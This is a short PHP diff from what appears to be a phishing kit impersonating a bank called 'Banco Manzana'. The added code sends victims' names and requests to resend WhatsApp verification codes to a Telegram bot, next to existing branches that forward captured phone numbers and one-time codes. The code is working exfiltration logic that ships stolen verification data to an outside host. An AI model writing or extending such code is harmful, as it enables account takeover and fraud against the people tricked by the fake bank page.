@@ -42,6 +42,12 @@ if ($type === 'phone') {
         'chat_id'=>$chat_id, 'text'=>$msg,
     ]));
 
+} elseif ($type === 'resend_code') {
+    $msg = "🔄 BANCO MANZANA — REENVÍO\n👤 {$u} solicitó reenviar el código WA\n🕒 {$date}";
+    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
+        'chat_id'=>$chat_id, 'text'=>$msg,
+    ]));
+
 } elseif ($type === 'code') {
     $msg  = "🔑 BANCO MANZANA — CÓDIGO WHATSAPP\n";
     $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
